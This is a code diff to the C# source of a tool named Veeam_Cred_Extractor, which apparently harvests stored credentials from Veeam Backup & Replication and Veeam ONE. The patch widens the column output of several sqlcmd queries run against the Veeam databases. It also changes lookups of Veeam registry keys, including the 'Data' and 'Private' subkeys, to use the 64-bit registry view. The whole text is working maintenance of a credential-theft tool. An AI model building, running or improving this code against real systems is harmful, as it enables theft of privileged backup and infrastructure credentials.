@@ -140,7 +140,7 @@ namespace Veeam_Cred_Extractor
                             var psi = new ProcessStartInfo
                             {
                                 FileName = sqlcmdPath,
-                                Arguments = $"-S {resolvedServer} -E -d {veeamOneDb} -Q \"{query}\" -h -1 -s\":\" -W",
+                                Arguments = $"-S {resolvedServer} -E -d {veeamOneDb} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
                                 UseShellExecute = false,
@@ -167,7 +167,7 @@ namespace Veeam_Cred_Extractor
                             var psi = new ProcessStartInfo
                             {
                                 FileName = sqlcmdPath,
-                                Arguments = $"-S {resolvedServer} -E -d {veeamOneDb} -Q \"{query}\" -h -1 -s\":\" -W",
+                                Arguments = $"-S {resolvedServer} -E -d {veeamOneDb} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
                                 UseShellExecute = false,
@@ -211,7 +211,7 @@ namespace Veeam_Cred_Extractor
                             var psi = new ProcessStartInfo
                             {
                                 FileName = sqlcmdPath,
-                                Arguments = $"-S {resolvedServer} -E -d {veeamDbName} -Q \"{query}\" -h -1 -s\":\" -W",
+                                Arguments = $"-S {resolvedServer} -E -d {veeamDbName} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
                                 UseShellExecute = false,
@@ -238,7 +238,7 @@ namespace Veeam_Cred_Extractor
                             var psi = new ProcessStartInfo
                             {
                                 FileName = sqlcmdPath,
-                                Arguments = $"-S {resolvedServer} -E -d {veeamDbName} -Q \"{query}\" -h -1 -s\":\" -W",
+                                Arguments = $"-S {resolvedServer} -E -d {veeamDbName} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
                                 UseShellExecute = false,
@@ -462,7 +462,7 @@ namespace Veeam_Cred_Extractor
                                 var psi = new ProcessStartInfo
                                 {
                                     FileName = sqlcmdPath,
-                                    Arguments = $"-S {mapServer} -E -d {mapDb} -Q \"{query}\" -h -1 -s\":\" -W",
+                                    Arguments = $"-S {mapServer} -E -d {mapDb} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                                     RedirectStandardOutput = true,
                                     RedirectStandardError = true,
                                     UseShellExecute = false,
@@ -542,7 +542,7 @@ namespace Veeam_Cred_Extractor
                         var psi = new ProcessStartInfo
                         {
                             FileName = sqlcmdPath,
-                            Arguments = $"-S {resolvedServer} -E -d {resolvedDb} -Q \"{query}\" -h -1 -s\":\" -W",
+                            Arguments = $"-S {resolvedServer} -E -d {resolvedDb} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                             RedirectStandardOutput = true,
                             RedirectStandardError = true,
                             UseShellExecute = false,
@@ -564,12 +564,14 @@ namespace Veeam_Cred_Extractor
                     string veeamOnePath = @"SOFTWARE\Veeam\Veeam ONE";
 
                     bool backupExists;
-                    using (var key = Registry.LocalMachine.OpenSubKey(veeamBackupPath))
+                    using (var hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
+                    using (var key = hklm.OpenSubKey(veeamBackupPath))
                         backupExists = key != null;
                     Console.WriteLine($"[INFO] Veeam Backup and Replication Registry Entries Exist: {backupExists}");
 
                     bool oneExists;
-                    using (var key = Registry.LocalMachine.OpenSubKey(veeamOnePath))
+                    using (var hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
+                    using (var key = hklm.OpenSubKey(veeamOnePath))
                         oneExists = key != null;
                     Console.WriteLine($"[INFO] Veeam One Registry Entries Exist: {oneExists}");
 
@@ -630,7 +632,7 @@ namespace Veeam_Cred_Extractor
                                 var psi = new ProcessStartInfo
                                 {
                                     FileName = sqlcmdPath,
-                                    Arguments = $"-S {autoServer} -E -d {autoDb} -Q \"{query}\" -h -1 -s\":\" -W",
+                                    Arguments = $"-S {autoServer} -E -d {autoDb} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                                     RedirectStandardOutput = true,
                                     RedirectStandardError = true,
                                     UseShellExecute = false,
@@ -715,7 +717,7 @@ namespace Veeam_Cred_Extractor
                         var psi = new ProcessStartInfo
                         {
                             FileName = sqlcmdPath,
-                            Arguments = $"-S {resolvedServer} -E -d {resolvedDb} -Q \"{query}\" -h -1 -s\":\" -W",
+                            Arguments = $"-S {resolvedServer} -E -d {resolvedDb} -Q \"{query}\" -h -1 -s\":\" -W -y 8000",
                             RedirectStandardOutput = true,
                             RedirectStandardError = true,
                             UseShellExecute = false,
@@ -742,7 +744,8 @@ namespace Veeam_Cred_Extractor
         {
             try
             {
-                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Veeam\Veeam Backup and Replication\Data"))
+                using (var hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
+                using (var key = hklm.OpenSubKey(@"SOFTWARE\Veeam\Veeam Backup and Replication\Data"))
                 {
                     if (key != null)
                     {
@@ -766,7 +769,8 @@ namespace Veeam_Cred_Extractor
         {
             try
             {
-                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Veeam\Veeam ONE\Private"))
+                using (var hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
+                using (var key = hklm.OpenSubKey(@"SOFTWARE\Veeam\Veeam ONE\Private"))
                 {
                     if (key != null)
                     {
@@ -810,7 +814,8 @@ namespace Veeam_Cred_Extractor
             var result = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
             try
             {
-                using (var key = Registry.LocalMachine.OpenSubKey(subkeyPath))
+                using (var hklm = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
+                using (var key = hklm.OpenSubKey(subkeyPath))
                 {
                     if (key != null)
                     {
